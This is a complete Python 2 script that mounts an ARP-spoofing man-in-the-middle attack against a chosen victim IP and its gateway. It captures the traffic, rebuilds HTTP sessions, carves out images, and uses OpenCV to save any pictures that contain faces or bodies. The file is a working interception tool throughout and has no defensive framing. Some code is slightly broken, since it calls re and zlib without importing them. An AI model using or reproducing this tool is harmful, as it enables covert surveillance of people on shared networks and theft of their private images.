from scapy.all import *
import sys
import os
import time
import cv2

packetCount = 0
PCAP = 'results.pcap'
PIC_DIR = '/home/user/Pictures/'
FACES_DIR = '/home/user/Pictures/faces'

# ask input from user
try:
    interface = raw_input("Enter Interface name: ")
    victimIP = raw_input("Enter Victim IP address: ")
    gatewayIP = raw_input("Enter Router IP: ")
    packetCount = raw_input("Packets: ")
except KeyboardInterrupt:
    print "Exiting..."
    sys.exit(1)

print "\n Enabling IP forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# use user input to get mac adr
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

# restore ARP tabel to previous state
def restoreARPtabel():
    print "\n Restore targets..."
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gatewayIP)
    send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
    send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
    print "Disabling IP Forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print "Exiting..."
    sys.exit(1)


# send out fake messages
def poison(gm, vm):
    send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=vm))
    send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gm))


# MAIN execute process of MITM, at the end save gathered traffic and conduct facerecon on pictures of the dump
# and dump the pictures with faces to folder
def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "Cant find victim MAC address"
        print "Exiting..."
        sys.exit(1)
    try:
        gateMAC = get_mac(gatewayIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "Cant find gateway MAC address"
        print "Exiting..."
        sys.exit(1)
    print "Poisoning targets..."
    while 1:
        try:
            poison(gateMAC, victimMAC)
            packets = sniff(count=packetCount, iface=interface)
            wrpcap(PCAP, packets)
            time.sleep(1.5)
        except KeyboardInterrupt:
            restoreARPtabel()
            assemble_http(PCAP)
            break


# works as trace stream in wireshark
def assemble_http(PCAP):
    carved_images, faces_detected = 0, 0
    p = rdpcap(PCAP)
    sessions = p.sessions()
    for session in sessions:
        http_payload = ''
        for packet in sessions[session]:
            try:
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    http_payload += str(packet[TCP].payload)
            except:
                pass
            headers = get_http_headers(http_payload)
            if headers is None:
                continue

            # extract the raw image and return the image type and the binary body of the image
            image, image_type = extract_image(headers, http_payload)
            if image is not None and image_type is not None:
                file_name = '%s-pilt_%d.%s' %(PCAP, carved_images, image_type)
                fd = open('%s/%s' % (PIC_DIR, file_name), 'wb')
                fd.write(image)
                fd.close()
                carved_images += 1
                try:
                    result = detect_face('%s/%s' % (PIC_DIR, file_name), file_name)
                    if result is True:
                        faces_detected += 1
                except:
                    pass
    return carved_images, faces_detected

# extract mime type
def get_http_headers(http_payload):
    try:
        headers_raw = http_payload[:http_payload.index("\r\n\r\n")+2]
        headers = dict(re.findall(r'(?P<name>.*?):(?P<value>.*?)\r\n', headers_raw))
    except:
        return None
    if 'Content-Type' not in headers:
        return None
    return headers

# get image if compressed extract
def extract_image(headers, http_payload):
    image, image_type = None, None
    try:
        if 'image' in headers['Content-Type']:
            image_type = headers['Content-Type'].split('/')[1]
            image = http_payload[http_payload.index('\r\n\r\n')+4:]
            try:
                if 'Content-Encoding' in headers.keys():
                    if headers['Content-Encoding'] == 'gzip':
                        image = zlib.decompress(image, 16+zlib.MAX_WBITS)
                    elif headers['Content-Encoding'] == 'deflate':
                        image = zlib.decompress(image)
            except:
                pass
    except:
        return None, None
    return image, image_type

# opencv magic, detect face using cacades, addional configuration included to be more accurate, save finding faces dir
def detect_face(path, file_name):
    img = cv2.imread(path)
    cascade = cv2.CascadeClassifier('/usr/local/share/OpenCV/haarcascades/haarcascade_upperbody.xml')
    rects = cascade.detectMultiScale(img, 1.3, 4, cv2.cv.CV_HAAR_SCALE_IMAGE, (20, 20))
    if len(rects) == 0:
        return False
    rects[:, 2:] += rects[:, :2]
    for x1, y1, x2, y2 in rects:
        cv2.rectangle(img, (x1, y1), (x2, y2), (127, 255, 0), 2)
        cv2.imwrite('%s/%s-%s' % (FACES_DIR, PCAP, file_name), img)
    return True


mitm()

